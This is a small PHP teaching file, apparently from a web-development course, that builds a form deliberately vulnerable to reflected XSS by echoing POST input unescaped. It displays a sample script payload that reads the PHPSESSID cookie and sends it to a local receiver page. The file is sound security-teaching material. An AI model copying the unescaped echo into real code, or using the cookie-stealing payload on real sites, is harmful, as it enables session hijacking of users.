<?php
// Esta es una aplicación PHP vulnerable a ataques XSS.

$message = "";

// Comprobar si se ha enviado un mensaje
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Tomar el mensaje de la entrada del usuario sin modificar
    
    // Código inseguro
    $message = $_POST['message'];
    
    // Código seguro
    // $message = htmlspecialchars($_POST['message']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable PHP App</title>
</head>
<body>
    <h1>Aplicación PHP Vulnerable a XSS</h1>
    <form method="post" action="index.php">
        <label for="message">Mensaje:</label><br>
        <input type="text" id="message" name="message"><br>
        <input type="submit" value="Enviar">
    </form>
    <p>Mensaje: <?php echo $message; ?></p> <!-- Vulnerabilidad aquí -->
    <p>Incluir el siguiente código Javascript: <?php echo htmlspecialchars("<script>window.location.href = 'http://localhost/dsw_actividades/ut4/ataque_xss_ejemplo/recibe_phpsessid.php?phpsessid=' + document.cookie.match(/PHPSESSID=([^;]+)/)[1];</script>
");?></p>
</body>
</html>
